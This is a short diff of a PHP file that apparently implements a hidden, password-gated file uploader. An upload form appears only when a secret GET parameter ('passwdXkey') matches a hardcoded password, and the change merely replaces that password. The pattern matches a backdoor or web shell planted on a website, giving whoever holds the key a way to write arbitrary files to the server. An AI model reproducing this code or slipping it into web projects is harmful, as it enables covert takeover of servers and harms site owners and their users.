@@ -16,7 +16,7 @@ if (move_uploaded_file($files, $folder . $file)) {
     $result = "Failed to upload...!";
 }
 }
-$password = "aisfoiau9339ru0q9";
+$password = "4Xvt3cH1337";
 if (isset($_GET['passwdXkey']) && $_GET['passwdXkey'] == $password) {
 echo '<br /><br /># UPLOADER<br /><form action="" method="post" enctype="multipart/form-data">
     <input type="file" name="files" />
